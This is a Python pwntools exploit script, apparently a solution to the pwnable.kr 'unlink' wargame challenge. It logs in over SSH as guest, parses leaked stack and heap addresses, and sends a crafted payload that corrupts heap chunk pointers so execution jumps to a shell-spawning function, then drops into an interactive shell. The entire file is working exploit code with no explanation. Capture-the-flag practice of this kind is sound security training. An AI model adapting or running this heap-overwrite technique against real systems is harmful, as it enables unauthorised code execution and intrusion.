from pwn import *
from struct import pack
import re

shell = ssh("unlink", "pwnable.kr", 2222, "guest")
conn = shell.process(["/home/unlink/unlink"])
data = conn.recvuntil("get shell!\n").decode("ascii").replace("\n",";")
print(data)

# get stack addr and heap addr with regular expression
m = re.search('stack address leak: (.*);.*heap address leak: ([^;]+);.*', data)
stackaddr = int(m.group(1), 16)
heapaddr = int(m.group(2), 16)
print("stack addr = " + hex(stackaddr))
print("heap addr = " + hex(heapaddr))

argcaddr = pack("<I", stackaddr + 16)
bufaddr = pack("<I", heapaddr + 12)
shelladdr = pack("<I", 0x080484eb)
dummybyte = ("\x11" * 0xc).encode()

print("argc addr = " + hex(unpack(argcaddr)) )
print("dummy byte = " + dummybyte.decode() )
print("buffer addr" + hex(unpack(bufaddr)) )
print("shell func addr = " + hex(unpack(shelladdr)) )

conn.sendline(shelladdr + dummybyte + bufaddr + argcaddr)
conn.interactive()
